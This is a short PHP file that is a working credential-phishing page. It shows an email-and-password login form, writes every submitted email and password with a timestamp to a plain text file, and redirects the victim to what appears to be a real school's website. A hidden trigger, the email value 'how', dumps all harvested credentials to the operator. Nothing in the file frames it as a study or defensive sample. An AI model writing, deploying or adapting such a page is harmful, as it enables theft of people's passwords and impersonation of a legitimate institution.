<?php

if(isset($_POST['email'])==true && $_POST['email']!='how'){

$pass=$_POST['password'];
$email=$_POST['email'];

$myfile = fopen("password.txt", "a") or die("Unable to open file!");
$txt = "email:".$email." \t "."password:".$pass." \t Date:".date("M,d,Y h:i:s A")."\n";
fwrite($myfile, $txt);
fclose($myfile);

    ?>
    <html>
    <script type="text/javascript">
    window.location.replace("http://www.hinhua.edu.my");
    </script>
    </html>

    <?php

}else if(isset($_POST['email'])==true && $_POST['email']=='how'){

    $file = file_get_contents('password.txt', true);
    echo $file;
}else{
?>

<form action="?" method="post">
  <label for="email">Email Address:</label><br>
  <input type="text" id="email" name="email"><br>
  <label for="password">Password:</label><br>
  <input type="password" id="password" name="password">
  <input type="submit" value="登陆">
</form>

<?php
}
?>